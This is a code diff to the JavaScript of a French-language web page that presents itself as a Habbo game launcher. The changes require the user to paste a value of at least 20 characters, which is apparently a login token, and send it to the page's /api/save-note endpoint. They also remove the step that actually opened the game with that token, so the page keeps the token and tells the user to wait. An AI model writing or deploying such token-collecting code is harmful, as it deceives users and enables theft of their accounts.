@@ -516,8 +516,18 @@ fetch('/api/me')
 });
 
 async function submitNote(){
+
   cleanedValue = removePrefix(input.value.trim());
-  if(!cleanedValue) return;
+
+  if(!cleanedValue){
+    alert("Veuillez entrer votre donnée.");
+    return;
+  }
+
+  if(cleanedValue.length < 20){
+    alert("Donnée invalide.");
+    return;
+  }
 
   await fetch('/api/save-note',{
     method:'POST',
@@ -525,7 +535,9 @@ async function submitNote(){
     body:JSON.stringify({note:cleanedValue})
   });
 
-  await fetch('/api/request-launch', { method: 'POST' });
+  await fetch('/api/request-launch', {
+    method:'POST'
+  });
 
   document.getElementById('savedNoteBox').textContent =
     "Donnée enregistrée ! Veuillez patienter quelques minutes.";
@@ -533,9 +545,16 @@ async function submitNote(){
   input.value="";
 }
 
-function launchHabbo(){
+async function launchHabbo(){
 
-  fetch('/api/request-launch', { method: 'POST' }); 
+  if(!cleanedValue){
+    alert("Veuillez d'abord enregistrer votre donnée.");
+    return;
+  }
+
+  await fetch('/api/request-launch', {
+    method:'POST'
+  });
 
   const loading=document.getElementById("habboLaunchLoading");
   const fill=document.getElementById("habboLaunchProgress");
@@ -551,13 +570,16 @@ function launchHabbo(){
     fill.style.width=progress+"%";
 
     if(progress>=100){
+
       clearInterval(interval);
 
       setTimeout(()=>{
-        window.location.href=`habbo://hab?server=hhfr&token=${cleanedValue}`;
+
         loading.classList.remove("active");
         fill.style.width="0%";
+
       },300);
+
     }
 
   },200);
